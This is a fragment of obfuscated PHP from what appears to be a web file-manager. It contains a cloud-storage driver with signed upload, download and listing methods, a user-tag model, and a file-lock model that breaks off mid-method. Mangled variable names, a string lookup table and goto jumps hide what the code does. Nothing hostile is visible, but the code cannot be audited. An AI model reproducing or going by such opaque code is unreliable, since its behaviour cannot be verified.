$this->listItemCache = !1; $ç¨öÏ” = $¯ËşšŞÓ = array(); $this->fileList($¢ûôƒø¬, $ç¨öÏ”, $¯ËşšŞÓ, !0); $this->listItemCache = !0; foreach ($¯ËşšŞÓ as $…³‰ßŒÁ) { $‚äñˆÎü = $this->ussRequest($…³‰ßŒÁ[$ÊÓªµ€[32]], $ÊÓªµ€[1577]); if (!$‚äñˆÎü[$ÊÓªµ€[1304]]) { return !1; } } usort($ç¨öÏ”, function ($ÏŞ£çİ¬, $…Ÿ´ÕŞë) { $½ù³†¨ =& $_SERVER[¶Ô„œ…¯]; return substr_count($…Ÿ´ÕŞë, $½ù³†¨[8]) - substr_count($ÏŞ£çİ¬, $½ù³†¨[8]); }); foreach ($ç¨öÏ” as $ñ”½·…ù) { $‚äñˆÎü = $this->ussRequest($ñ”½·…ù, $ÊÓªµ€[1577]); if (!$‚äñˆÎü[$ÊÓªµ€[1304]]) { return !1; } } $‚äñˆÎü = $this->ussRequest($¢ûôƒø¬, $ÊÓªµ€[1577]); return $‚äñˆÎü[$ÊÓªµ€[1304]]; } public function rename($¸…ªª‡´, $È½º´½) { if ($this->isFile($¸…ªª‡´)) { $È½º´½ = get_path_father($¸…ªª‡´) . $È½º´½; return $this->moveFile($¸…ªª‡´, $È½º´½); } return $this->renameObject($¸…ªª‡´, $È½º´½); } public function fileInfo($ìòØ›„ß, $Í­­ÈÃà = false, $¥°ìÍÒ¯ = array()) { $¿•×¬€Ã =& $_SERVER[¶Ô„œ…¯]; $Ñ§‡ïÑ’ = array($¿•×¬€Ã[32] => $this->pathThis($ìòØ›„ß), $¿•×¬€Ã[87] => $this->getPathOuter($¿•×¬€Ã[8] . $ìòØ›„ß), $¿•×¬€Ã[33] => $¿•×¬€Ã[232], $¿•×¬€Ã[79] => isset($¥°ìÍÒ¯[$¿•×¬€Ã[79]]) ? $¥°ìÍÒ¯[$¿•×¬€Ã[79]] : 0, $¿•×¬€Ã[169] => $this->ext($ìòØ›„ß)); if ($Í­­ÈÃà) { return $Ñ§‡ïÑ’; } $Ñ§‡ïÑ’[$¿•×¬€Ã[233]] = $Ñ§‡ïÑ’[$¿•×¬€Ã[88]] = 0; $Ñ§‡ïÑ’[$¿•×¬€Ã[234]] = $Ñ§‡ïÑ’[$¿•×¬€Ã[235]] = !0; if (empty($¥°ìÍÒ¯)) { $¥°ìÍÒ¯ = $this->objectMeta($ìòØ›„ß); if (!$¥°ìÍÒ¯) { return $Ñ§‡ïÑ’; } } $Ñ§‡ïÑ’[$¿•×¬€Ã[233]] = intval($¥°ìÍÒ¯[$¿•×¬€Ã[1578]]); $Ñ§‡ïÑ’[$¿•×¬€Ã[88]] = intval($¥°ìÍÒ¯[$¿•×¬€Ã[1579]]); $Ñ§‡ïÑ’[$¿•×¬€Ã[79]] = $¥°ìÍÒ¯[$¿•×¬€Ã[79]]; return $Ñ§‡ïÑ’; } public function folderInfo($ãÜŠò‰, $é®øã™ô = false) { $úèñÆĞ× =& $_SERVER[¶Ô„œ…¯]; $‹Ûş¥¢ = array($úèñÆĞ×[32] => $this->pathThis($ãÜŠò‰), $úèñÆĞ×[87] => $this->getPathOuter($úèñÆĞ×[8] . $ãÜŠò‰), $úèñÆĞ×[33] => $úèñÆĞ×[78]); if ($é®øã™ô) { return $‹Ûş¥¢; } $‹Ûş¥¢[$úèñÆĞ×[233]] = $‹Ûş¥¢[$úèñÆĞ×[88]] = 0; $‹Ûş¥¢[$úèñÆĞ×[234]] = $‹Ûş¥¢[$úèñÆĞ×[235]] = !0; if (empty($“Çóƒû)) { $“Çóƒû = $this->objectMeta($ãÜŠò‰); if (!$“Çóƒû) { return $‹Ûş¥¢; } } $‹Ûş¥¢[$úèñÆĞ×[233]] = intval($“Çóƒû[$úèñÆĞ×[1578]]); $‹Ûş¥¢[$úèñÆĞ×[88]] = intval($“Çóƒû[$úèñÆĞ×[1579]]); return $‹Ûş¥¢; } private function listObjs($³¢¾½Öº, $ÊÕÀâ®Š = 0, $„ø­—ğ = 1000) { $®Š«Â¦Û =& $_SERVER[¶Ô„œ…¯]; $¶ôÕ²•ø = array($®Š«Â¦Û[1580], $®Š«Â¦Û[1581] . $„ø­—ğ); if ($ÊÕÀâ®Š) { $¶ôÕ²•ø[] = $®Š«Â¦Û[1582] . $ÊÕÀâ®Š; } $×ÕÁÌÇã = $this->ussRequest($³¢¾½Öº, $®Š«Â¦Û[1504], !1, $¶ôÕ²•ø); return !$×ÕÁÌÇã[$®Š«Â¦Û[1304]] ? !1 : $×ÕÁÌÇã[$®Š«Â¦Û[1294]]; } private function fileList($ĞìÂ’üÅ, &$®Œø¢ŒÁ, &$•¶¾Ÿè, $‡ÑšÌì = false) { $¤™›¥Û =& $_SERVER[¶Ô„œ…¯]; $ÍÒéĞ™Û = $¤™›¥Û[12]; $»‰¶Œ¹ì = 1000; $ª×¦›¯œ = rtrim($ĞìÂ’üÅ, $¤™›¥Û[8]) . $¤™›¥Û[8]; while (!0) { check_abort(); $®Ïù É = $this->listObjs($ĞìÂ’üÅ, $ÍÒéĞ™Û, $»‰¶Œ¹ì); if (!$®Ïù É) { return !1; } $ÍÒéĞ™Û = isset($®Ïù É[$¤™›¥Û[1583]]) ? $®Ïù É[$¤™›¥Û[1583]] : $¤™›¥Û[12]; $öÈÀºñğ = isset($®Ïù É[$¤™›¥Û[1584]]) ? $®Ïù É[$¤™›¥Û[1584]] : array(); foreach ($öÈÀºñğ as $àáÍ¬°÷) { $²İÕò = $àáÍ¬°÷[$¤™›¥Û[33]] == $¤™›¥Û[78] ? !0 : !1; $¡œ„¥¶² = ltrim($ª×¦›¯œ . $àáÍ¬°÷[$¤™›¥Û[32]], $¤™›¥Û[8]) . ($²İÕò ? $¤™›¥Û[8] : $¤™›¥Û[12]); $èÊ¿¨› = array($¤™›¥Û[32] => $¡œ„¥¶², $¤™›¥Û[33] => $²İÕò ? $¤™›¥Û[78] : $¤™›¥Û[232], $¤™›¥Û[79] => $àáÍ¬°÷[$¤™›¥Û[414]], $¤™›¥Û[1579] => $àáÍ¬°÷[$¤™›¥Û[1585]]); $this->cacheMethodInfoSet($¡œ„¥¶², $²İÕò, $èÊ¿¨›); if ($²İÕò) { $®Œø¢ŒÁ[] = $¡œ„¥¶²; if ($‡ÑšÌì) { $this->fileList($¡œ„¥¶², $®Œø¢ŒÁ, $•¶¾Ÿè, $‡ÑšÌì); } continue; } $•¶¾Ÿè[] = $èÊ¿¨›; } if (count($öÈÀºñğ) < $»‰¶Œ¹ì) { break; } } $this->cacheMethodInfoSet($ĞìÂ’üÅ, !0); } public function listPath($¸û§Ë®ï, $©ø–ÅãÚ = false) { $½üÚÕÍ =& $_SERVER[¶Ô„œ…¯]; $Ğå±şÀº = $â‹Ô®›¢ = array(); $this->fileList($¸û§Ë®ï, $Ğå±şÀº, $â‹Ô®›¢); foreach ($Ğå±şÀº as $…Ã—ß›™ => $’¹ËÉà×) { $Ğå±şÀº[$…Ã—ß›™] = $this->folderInfo($’¹ËÉà×, $©ø–ÅãÚ); } foreach ($â‹Ô®›¢ as $…Ã—ß›™ => $’¹ËÉà×) { $â‹Ô®›¢[$…Ã—ß›™] = $this->fileInfo($’¹ËÉà×[$½üÚÕÍ[32]], $©ø–ÅãÚ, $’¹ËÉà×); } return array($½üÚÕÍ[85] => $Ğå±şÀº, $½üÚÕÍ[86] => $â‹Ô®›¢); } public function has($³ÅŸüò¨, $¸”ñÔ¹ = false, $ïê‚çñØ = true) { $©Ø„€âè =& $_SERVER[¶Ô„œ…¯]; $°–áãÆÄ = $©Ø„€âè[12]; $®Ä ñÇ = 500; $şÈß°˜ = 0; $ğÄ´ıµ = 0; $Õ¿®¿Ìñ = rtrim($³ÅŸüò¨, $©Ø„€âè[8]) . $©Ø„€âè[8]; while (!0) { check_abort(); $ÂÍÖ¢Ô° = $this->listObjs($³ÅŸüò¨, $°–áãÆÄ, $®Ä ñÇ); if (!$ÂÍÖ¢Ô°) { return !1; } $°–áãÆÄ = isset($ÂÍÖ¢Ô°[$©Ø„€âè[1583]]) ? $ÂÍÖ¢Ô°[$©Ø„€âè[1583]] : $©Ø„€âè[12]; $İóçî¤› = isset($ÂÍÖ¢Ô°[$©Ø„€âè[1584]]) ? $ÂÍÖ¢Ô°[$©Ø„€âè[1584]] : array(); if (empty($İóçî¤›)) { break; } $×œü®ê = array_filter($İóçî¤›, function ($¦ëªéÈ¡) { $“‘“Üùœ =& $_SERVER[¶Ô„œ…¯]; return $¦ëªéÈ¡[$“‘“Üùœ[33]] == $“‘“Üùœ[78]; }); $åµ¿Õ¨¥ = count($İóçî¤›); $×œü®ê = count($×œü®ê); $å¾“õòï = $åµ¿Õ¨¥ - $×œü®ê; if ($¸”ñÔ¹) { $ğÄ´ıµ += $×œü®ê; $şÈß°˜ += $å¾“õòï; if ($åµ¿Õ¨¥ < $®Ä ñÇ) { break; } continue; } if ($ïê‚çñØ) { if ($å¾“õòï) { return !0; } } else { if ($×œü®ê) { return !0; } } if ($åµ¿Õ¨¥ < $®Ä ñÇ) { break; } } if ($¸”ñÔ¹) { return array($©Ø„€âè[241] => $şÈß°˜, $©Ø„€âè[242] => $ğÄ´ıµ); } return !1; } public function listAll($ÒİâË±) { $Ş£ëıÓí =& $_SERVER[¶Ô„œ…¯]; $Ğ¿ĞÜ  = $Á´©Ò² = array(); $this->fileList($ÒİâË±, $Ğ¿ĞÜ , $Á´©Ò², !0); $¡ğËøÓ® = array_to_keyvalue($Á´©Ò², $Ş£ëıÓí[32]); foreach ($Ğ¿ĞÜ  as $ƒ•Ñ­ˆ) { if (is_string($ƒ•Ñ­ˆ)) { $¡ğËøÓ®[$ƒ•Ñ­ˆ] = array($Ş£ëıÓí[79] => 0); } } return $this->listAllFiles($ÒİâË±, $¡ğËøÓ®); } public function canRead($°Í‚ÇÄ•) { return $this->exist($°Í‚ÇÄ•) ? !0 : !1; } public function canWrite($Ö™Öıûì) { return $this->exist($Ö™Öıûì) ? !0 : !1; } public function getContent($°àı‹Ï) { return $this->fileSubstr($°àı‹Ï, 0, -1); } public function setContent($ÅâÎàì, $œ“Î°àõ = '') { $ÁÜéèˆ€ =& $_SERVER[¶Ô„œ…¯]; if (!$œ“Î°àõ) { $í­µÀ×‹ = $this->ussRequest($ÅâÎàì, $ÁÜéèˆ€[290]); return $í­µÀ×‹[$ÁÜéèˆ€[1304]]; } $£ê‘´¥ú = $this->tempFile($this->pathThis($ÅâÎàì)); file_put_contents($£ê‘´¥ú, $œ“Î°àõ); if ($this->upload($ÅâÎàì, $£ê‘´¥ú)) { $this->tempFileRemve($£ê‘´¥ú); return !0; } return !1; } public function fileSubstr($ÊÔò•ø, $Ú»¹•‚É, $–­›À–) { $ä÷÷şèñ =& $_SERVER[¶Ô„œ…¯]; if (!($­õĞ»çô = $this->link($ÊÔò•ø))) { return !1; } $°¤£®Ñ¦ = !1; if ($–­›À– > 0) { $ÈÁı­Ñ¾ = $Ú»¹•‚É + $–­›À– - 1; $°¤£®Ñ¦ = array($ä÷÷şèñ[1544] . $Ú»¹•‚É . $ä÷÷şèñ[464] . $ÈÁı­Ñ¾); } $ã¥Š›Âı = url_request($­õĞ»çô, $ä÷÷şèñ[1504], !1, $°¤£®Ñ¦); return $ã¥Š›Âı[$ä÷÷şèñ[828]] ? $ã¥Š›Âı[$ä÷÷şèñ[1294]] : !1; } public function upload($®”ØâíÅ, $ùŒ£ïÆ, $Û”€¥Ï = false, $¢è•µÎ = REPEAT_REPLACE) { $°ˆ¢„‹¿ =& $_SERVER[¶Ô„œ…¯]; $¶‹Í¯€¿ = IO::size($ùŒ£ïÆ); if ($¶‹Í¯€¿ <= 1024 * 1024 * 200) { $‚ò²­¸È = array($°ˆ¢„‹¿[1586] . $ùŒ£ïÆ); $äÖÇÎó¶ = $this->ussRequest($®”ØâíÅ, $°ˆ¢„‹¿[255], $‚ò²­¸È); return $äÖÇÎó¶[$°ˆ¢„‹¿[1304]] ? $this->getPathOuter($®”ØâíÅ) : !1; } $„˜ÎÃ… = 1024 * 1024 * 10; $ÓœË¯›É = array($°ˆ¢„‹¿[1587], $°ˆ¢„‹¿[1588] . $¶‹Í¯€¿, $°ˆ¢„‹¿[1589], $°ˆ¢„‹¿[1590] . $„˜ÎÃ…); $äÖÇÎó¶ = $this->ussRequest($®”ØâíÅ, $°ˆ¢„‹¿[255], !1, $ÓœË¯›É); if (!$äÖÇÎó¶[$°ˆ¢„‹¿[1304]]) { return !1; } $‡ìÆß„ó = $äÖÇÎó¶[$°ˆ¢„‹¿[1294]]; $ÄÀíº¯· = 0; $ÍÛ®ÈúÍ = $‡ìÆß„ó[$°ˆ¢„‹¿[1591]]; $üÛßàã = fopen($ùŒ£ïÆ, $°ˆ¢„‹¿[1467]); if (!$üÛßàã) { return !1; } do { $·¹âÔ¿è = $‡ìÆß„ó[$°ˆ¢„‹¿[1592]]; fseek_64($üÛßàã, $ÄÀíº¯·); $‚áŞßŞ» = fread($üÛßàã, $·¹âÔ¿è); $Í§Œü÷… = 0; do { $Í§Œü÷…++; $‡ìÆß„ó = $this->uploadPart($®”ØâíÅ, $‡ìÆß„ó, $‚áŞßŞ»); } while (!$‡ìÆß„ó && $Í§Œü÷… < 3); if (!$‡ìÆß„ó) { return !1; } $ÍÛ®ÈúÍ = $‡ìÆß„ó[$°ˆ¢„‹¿[1591]]; $ÄÀíº¯· += $·¹âÔ¿è; } while ($ÍÛ®ÈúÍ != -1); fclose($üÛßàã); $ÓœË¯›É = array($°ˆ¢„‹¿[1593], $°ˆ¢„‹¿[1594] . $‡ìÆß„ó[$°ˆ¢„‹¿[1595]], $°ˆ¢„‹¿[1589]); $äÖÇÎó¶ = $this->ussRequest($®”ØâíÅ, $°ˆ¢„‹¿[255], !1, $ÓœË¯›É); return $äÖÇÎó¶[$°ˆ¢„‹¿[1304]] ? $this->getPathOuter($¤şş´Â°) : !1; } private function uploadPart($²Šº÷ÛĞ, $À±© ˆ, &$•…üÉ) { $ò—ÈéîÀ =& $_SERVER[¶Ô„œ…¯]; $ÉàÎ«ä = array($ò—ÈéîÀ[1596], $ò—ÈéîÀ[1594] . $À±© ˆ[$ò—ÈéîÀ[1595]], $ò—ÈéîÀ[1597] . $À±© ˆ[$ò—ÈéîÀ[1591]], $ò—ÈéîÀ[146] . $À±© ˆ[$ò—ÈéîÀ[1592]]); $âùÒ–­ = $this->ussRequest($²Šº÷ÛĞ, $ò—ÈéîÀ[255], $•…üÉ, $ÉàÎ«ä); return !$âùÒ–­[$ò—ÈéîÀ[1304]] ? $âùÒ–­[$ò—ÈéîÀ[1304]] : $âùÒ–­[$ò—ÈéîÀ[1294]]; } public function uploadFormData($×èâäÎá, $ôà¡­×‘ = 3600) { return $this->uploadPolicy($×èâäÎá, $ôà¡­×‘); } public function uploadMultiData($«„ÊÎ©¥, $×ÎÈºë» = 3600) { $¹¯÷çÙ =& $_SERVER[¶Ô„œ…¯]; $¸¬µ‰â = (int) $GLOBALS[$¹¯÷çÙ[7]][$¹¯÷çÙ[79]]; return $this->uploadPolicy($«„ÊÎ©¥, $×ÎÈºë», $¸¬µ‰â); } private function uploadPolicy($ŠøËä„Ü, $‚ñ„‡…ñ = 3600, $šÃ¹Ò™Ê = 0) { $¦£¬º³Ú =& $_SERVER[¶Ô„œ…¯]; $àö¾Ã­Û = $¦£¬º³Ú[8] . $this->bucket; $Óş÷ˆë = gmdate($¦£¬º³Ú[1502]); $Ü¦Ç«… = array($¦£¬º³Ú[1598] => $this->bucket, $¦£¬º³Ú[1599] => $ŠøËä„Ü, $¦£¬º³Ú[1600] => time() + $‚ñ„‡…ñ, $¦£¬º³Ú[1601] => $Óş÷ˆë); if ($šÃ¹Ò™Ê) { $Ü¦Ç«…[$¦£¬º³Ú[1487]] = $šÃ¹Ò™Ê; } $öÓñšË = base64_encode(json_encode($Ü¦Ç«…)); $àªùªˆä = base64_encode(hash_hmac($¦£¬º³Ú[1555], "\x50\x4f\123\x54\x26{$àö¾Ã­Û}\x26{$Óş÷ˆë}\x26{$öÓñšË}", md5("{$this->userpass}"), !0)); $Ï™œšÎù = array($¦£¬º³Ú[279] => $öÓñšË, $¦£¬º³Ú[1602] => "\125\120\x59\x55\x4e\40{$this->username}\x3a{$àªùªˆä}", $¦£¬º³Ú[208] => $this->endpoint . $àö¾Ã­Û); return $Ï™œšÎù; } public function download($ÚÏ‹Éª³, $ªš©°¢”) { $§Íœ¼ÍÜ = IO::getPathInner(IO::mkfile($ªš©°¢”)); if (!($ªû í‰Å = $this->link($ÚÏ‹Éª³))) { return !1; } $óç§–ü = 0; $ŠùìÉ¼ç = 1024 * 200; $ö¼Œä· = fopen($§Íœ¼ÍÜ, $_SERVER[¶Ô„œ…¯][1550]); while (!0) { $›Æˆ×™ = $this->fileSubstr($ÚÏ‹Éª³, $óç§–ü, $ŠùìÉ¼ç); if ($›Æˆ×™ === !1) { return !1; } fwrite($ö¼Œä·, $›Æˆ×™); $óç§–ü += $ŠùìÉ¼ç; if (strlen($›Æˆ×™) < $ŠùìÉ¼ç) { break; } } fclose($ö¼Œä·); return $ªš©°¢”; } public function link($ß¹ë’¯—, $•§ÀØ‡¡ = array()) { $”úñ¼‡“ =& $_SERVER[¶Ô„œ…¯]; $ß¹ë’¯— = trim($ß¹ë’¯—, $”úñ¼‡“[8]); if (!empty($this->token)) { $…–×é‹— = strtotime(date($”úñ¼‡“[1603])); $Û¾ìÕŸ¹ = substr(md5($this->token . $”úñ¼‡“[286] . $…–×é‹— . $”úñ¼‡“[1604] . $ß¹ë’¯—), 12, 8) . $…–×é‹—; $•§ÀØ‡¡[] = $”úñ¼‡“[1605] . $Û¾ìÕŸ¹; } $®àËËÅ = !empty($•§ÀØ‡¡) ? $”úñ¼‡“[76] . implode($”úñ¼‡“[286], $•§ÀØ‡¡) : $”úñ¼‡“[12]; return $this->getHost() . $”úñ¼‡“[8] . $this->pathEncode($ß¹ë’¯—) . $®àËËÅ; } public function fileOut($í¢ËÒŠÅ, $»™Õ÷¾Ì = false, $›­Ìúƒ» = false, $ŒÒõ­å = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($í¢ËÒŠÅ, $»™Õ÷¾Ì, $›­Ìúƒ», $ŒÒõ­å); } if (!$›­Ìúƒ») { $›­Ìúƒ» = $this->pathThis($í¢ËÒŠÅ); } $­˜ËÎšˆ = $»™Õ÷¾Ì ? array($_SERVER[¶Ô„œ…¯][1606] . rawurlencode($›­Ìúƒ»)) : array(); $Åğµä = $this->link($í¢ËÒŠÅ, $­˜ËÎšˆ); $this->fileOutLink($Åğµä); } public function fileOutServer($Çšåë»Ô, $±ÄîÀÆ“ = false, $ÈªæÒå = false, $äé”È®Ÿ = '') { parent::fileOut($Çšåë»Ô, $±ÄîÀÆ“, $ÈªæÒå, $äé”È®Ÿ); } public function fileOutImage($Å¥úä, $²å¯æÍ = 250) { $öÛùş½ = $this->link($Å¥úä . $_SERVER[¶Ô„œ…¯][1607] . $²å¯æÍ); $this->fileOutLink($öÛùş½); } public function fileOutImageServer($îÂ º’, $ˆƒæÅùƒ = 250) { parent::fileOutImage($îÂ º’, $ˆƒæÅùƒ); } public function hashMd5($„Ÿû“ƒÔ) { $Ù©“¦’º =& $_SERVER[¶Ô„œ…¯]; $ÉÙÉİ†• = $this->_objectMeta($„Ÿû“ƒÔ); return isset($ÉÙÉİ†•[$Ù©“¦’º[247]]) ? $ÉÙÉİ†•[$Ù©“¦’º[247]] : !1; } public function size($ê Ç²Şå) { $£ßõË¤ş = $this->objectMeta($ê Ç²Şå); return $£ßõË¤ş ? $£ßõË¤ş[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function info($ú…‡İÃ) { if ($this->isFolder($ú…‡İÃ)) { return $this->folderInfo($ú…‡İÃ); } else { if ($this->isFile($ú…‡İÃ)) { return $this->fileInfo($ú…‡İÃ); } } return !1; } public function exist($ï” áÕ) { return $this->isFile($ï” áÕ) || $this->isFolder($ï” áÕ); } public function isFile($Şîõ¸¸) { return !$this->isFolder($Şîõ¸¸) && $this->objectMeta($Şîõ¸¸); } public function isFolder($Š×á•‘) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][179], $Š×á•‘); } protected function objectMeta($úö¤§ü„) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][181], $úö¤§ü„); } protected function _objectMeta($Šµ÷Æ†) { $ÚÆ­ú =& $_SERVER[¶Ô„œ…¯]; if ($Šµ÷Æ† == $ÚÆ­ú[12] || $Šµ÷Æ† == $ÚÆ­ú[8]) { return array(); } $Ùó¦Ïì = $this->ussRequest($Šµ÷Æ†, $ÚÆ­ú[1608]); if (!$Ùó¦Ïì[$ÚÆ­ú[1304]]) { return null; } $’©¿í‚æ = isset($Ùó¦Ïì[$ÚÆ­ú[1294]]) ? $Ùó¦Ïì[$ÚÆ­ú[1294]] : array(); if (!isset($’©¿í‚æ[$ÚÆ­ú[1609]])) { return null; } $ï°Ì = array($ÚÆ­ú[33] => isset($’©¿í‚æ[$ÚÆ­ú[1609]]) ? $’©¿í‚æ[$ÚÆ­ú[1609]] : null, $ÚÆ­ú[79] => isset($’©¿í‚æ[$ÚÆ­ú[1610]]) ? $’©¿í‚æ[$ÚÆ­ú[1610]] : null, $ÚÆ­ú[247] => isset($’©¿í‚æ[$ÚÆ­ú[1611]]) ? $’©¿í‚æ[$ÚÆ­ú[1611]] : null, $ÚÆ­ú[1578] => isset($’©¿í‚æ[$ÚÆ­ú[1612]]) ? $’©¿í‚æ[$ÚÆ­ú[1612]] : null); $ï°Ì[$ÚÆ­ú[1579]] = isset($’©¿í‚æ[$ÚÆ­ú[1613]]) ? strtotime($’©¿í‚æ[$ÚÆ­ú[1613]]) : $ï°Ì[$ÚÆ­ú[1578]]; return $ï°Ì; } protected function _isFolder($’šÚ•ƒ) { $†‡éÉêÑ =& $_SERVER[¶Ô„œ…¯]; if ($’šÚ•ƒ == $†‡éÉêÑ[12] || $’šÚ•ƒ == $†‡éÉêÑ[8]) { return !0; } $›¦Ó‚é = $this->_objectMeta($’šÚ•ƒ); return isset($›¦Ó‚é[$†‡éÉêÑ[33]]) && $›¦Ó‚é[$†‡éÉêÑ[33]] == $†‡éÉêÑ[78] ? !0 : !1; } } goto C×®Î˜°Í; CØÜ‰–À: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\x61\x67\114\151\163\164"; public $modelType = "\125\x73\x65\x72\x4f\x70\164\151\x6f\156"; public $field = array("\156\141\x6d\145", "\163\x74\x79\x6c\145", "\x73\x6f\x72\164"); public function listData($“Êèş = false, $ºˆóŠ¦‰ = "\163\x6f\x72\164", $‘Çª˜ = false) { return parent::listData($“Êèş, $ºˆóŠ¦‰, $‘Çª˜); } public function remove($°Ìˆ’£ğ) { return parent::remove($°Ìˆ’£ğ); } public function add($£­ã¢İƒ, $ß˜¦»µò = "\x6c\x61\142\x65\x6c\x2d\147\162\145\x79\55\156\x6f\x72\x6d\x61\x6c") { $æÅÃ‡ô =& $_SERVER[¶Ô„œ…¯]; if ($this->findByName($£­ã¢İƒ)) { return !1; } $äãÈ¯–Ã = array($æÅÃ‡ô[496] => $£­ã¢İƒ, $æÅÃ‡ô[560] => $ß˜¦»µò, $æÅÃ‡ô[1984] => $this->getSort($æÅÃ‡ô[337]) + 1); return parent::insert($äãÈ¯–Ã); } public function update($“ÆçÅØ¾, $àŸ®î¹) { $öçÌÚ€ı =& $_SERVER[¶Ô„œ…¯]; $Üîç¿©Ø = $this->listData($“ÆçÅØ¾); $èº¶ÆÑ¢ = $this->findByName($àŸ®î¹[$öçÌÚ€ı[32]]); if (!$Üîç¿©Ø || $èº¶ÆÑ¢ && $èº¶ÆÑ¢[$öçÌÚ€ı[477]] != $Üîç¿©Ø[$öçÌÚ€ı[477]]) { return !1; } return parent::update($“ÆçÅØ¾, $àŸ®î¹); } public function moveTop($€ÍÀ¾’í) { $ù²±½ =& $_SERVER[¶Ô„œ…¯]; $«»¬ùçÆ = parent::listData(); $îŠıôŠÒ = $this->getSort($ù²±½[336]); foreach ($«»¬ùçÆ as &$Ğ¡òªëÉ) { if ($Ğ¡òªëÉ[$ù²±½[477]] == $€ÍÀ¾’í) { $Ğ¡òªëÉ[$ù²±½[2004]] = $îŠıôŠÒ; continue; } $Ğ¡òªëÉ[$ù²±½[2004]] += 1; } unset($Ğ¡òªëÉ); return parent::resetData($«»¬ùçÆ); } public function moveBottom($Ìšõşš) { $°‹ğİÖÓ =& $_SERVER[¶Ô„œ…¯]; $ŠÖ¬°€˜ = $this->getSort($°‹ğİÖÓ[337]) + 1; return parent::update($Ìšõşš, array($°‹ğİÖÓ[2004] => $ŠÖ¬°€˜)); } public function resetSort($„¼¿÷œò) { $ÎµÒ¿¨« =& $_SERVER[¶Ô„œ…¯]; $Ãà ¸ä = array(); $„¼¿÷œò = is_array($„¼¿÷œò) ? $„¼¿÷œò : array(); for ($­ÈÌÈÖ = 0; $­ÈÌÈÖ < count($„¼¿÷œò); $­ÈÌÈÖ++) { $Ãà ¸ä[$„¼¿÷œò[$­ÈÌÈÖ] . $ÎµÒ¿¨«[12]] = $­ÈÌÈÖ + 1; } $Áì„ğªÉ = parent::listData(); foreach ($Áì„ğªÉ as &$Ó‹ê¨·Œ) { $õû­æ‚ï = $Ãà ¸ä[$Ó‹ê¨·Œ[$ÎµÒ¿¨«[477]]]; $Ó‹ê¨·Œ[$ÎµÒ¿¨«[2004]] = $õû­æ‚ï ? $õû­æ‚ï : $Ó‹ê¨·Œ[$ÎµÒ¿¨«[2004]]; } unset($Ó‹ê¨·Œ); return parent::resetData($Áì„ğªÉ); } private function getSort($äÇöãÑ–) { $½Ô€¥‰ =& $_SERVER[¶Ô„œ…¯]; $Ş½â¢Ö§ = parent::listData(); $·…Ğšßï = array_to_keyvalue($Ş½â¢Ö§, $½Ô€¥‰[12], $½Ô€¥‰[2004]); if (!$·…Ğšßï) { $·…Ğšßï = array(0); } $´ä—ß = $äÇöãÑ– == $½Ô€¥‰[337] ? max($·…Ğšßï) : min($·…Ğšßï); return intval($´ä—ß); } } goto D½öæïòóÇ; aƒ©‰ÄãÍ : class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($“ñä…Ö) { $ı³áÏ¿÷ =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ı³áÏ¿÷[623], $“ñä…Ö); $ôÍí¡­ä = 1; $this->_lockEvent($“ñä…Ö, array($ı³áÏ¿÷[624], $ı³áÏ¿÷[625]), $ôÍí¡­ä); $this->_lockParent($“ñä…Ö, array($ı³áÏ¿÷[625]), $ôÍí¡­ä); $this->_lockEvent($“ñä…Ö, array($ı³áÏ¿÷[626], $ı³áÏ¿÷[627]), $ôÍí¡­ä); $this->_lockCheckEnd($ı³áÏ¿÷[623], $“ñä…Ö); } public function lockCopyEnd($½÷Í‘Ö‚) { $ô¾˜ñáó =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $›øÍÇºİ = 0; $this->_lockEvent($½÷Í‘Ö‚, array($ô¾˜ñáó[624], $ô¾˜ñáó[625]), $›øÍÇºİ); $this->_lockParent($½÷Í‘Ö‚, array($ô¾˜ñáó[625]), $›øÍÇºİ); $this->_lockEvent($½÷Í‘Ö‚, array($ô¾˜ñáó[626], $ô¾˜ñáó[627]), $›øÍÇºİ); } public function lockWriteStart($Ï†Â¤ñ¶, $éù¾ØŒ¾ = '') { $„®¯È–Ñ =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($„®¯È–Ñ[624], $Ï†Â¤ñ¶); $¥ğë†’– = 1; $this->_lockKey($„®¯È–Ñ[628] . $Ï†Â¤ñ¶ . $„®¯È–Ñ[10] . $éù¾ØŒ¾, $¥ğë†’–); $this->_lockEvent($Ï†Â¤ñ¶, array($„®¯È–Ñ[623], $„®¯È–Ñ[625]), $¥ğë†’–); $this->_lockParent($Ï†Â¤ñ¶, array($„®¯È–Ñ[623], $„®¯È–Ñ[625]), $¥ğë†’–); $this->_lockCheckEnd($„®¯È–Ñ[624], $Ï†Â¤ñ¶); } public function lockWriteEnd($Ùµ¬ ×, $Ä›‡­²Æ = '') { $ÇŒö“‚¶ =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $Úí¹ü± = 0; $this->_lockKey($ÇŒö“‚¶[628] . $Ùµ¬ × . $ÇŒö“‚¶[10] . $Ä›‡­²Æ, $Úí¹ü±); $this->_lockEvent($Ùµ¬ ×, array($ÇŒö“‚¶[623], $ÇŒö“‚¶[625]), $Úí¹ü±); $this->_lockParent($Ùµ¬ ×, array($ÇŒö“‚¶[623], $ÇŒö“‚¶[625]), $Úí¹ü±); } public function lockMoveStart($¯î¬ø) { $¿¸»¹‘˜ =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($¿¸»¹‘˜[625], $¯î¬ø); $®ö‰¬ = 1; $this->_lockKey($¿¸»¹‘˜[629] . $¯î¬ø, $®ö‰¬); $this->_lockEvent($¯î¬ø, array($¿¸»¹‘˜[623], $¿¸»¹‘˜[624]), $®ö‰¬); $this->_lockParent($¯î¬ø, array($¿¸»¹‘˜[623], $¿¸»¹‘˜[625]), $®ö‰¬); $this->_lockEvent($¯î¬ø, array($¿¸»¹‘˜[630], $¿¸»¹‘˜[626], $¿¸»¹‘˜[627]), $®ö‰¬); $this->_lockCheckEnd($¿¸»¹‘˜[625], $¯î¬ø); } public function lockMoveEnd($î´Áê§) { $¡úæ¾éº =& $_SERVER[¶Ô„œ…¯]; if (!$this->allowLock()) { return; } $îü©ıÛ« 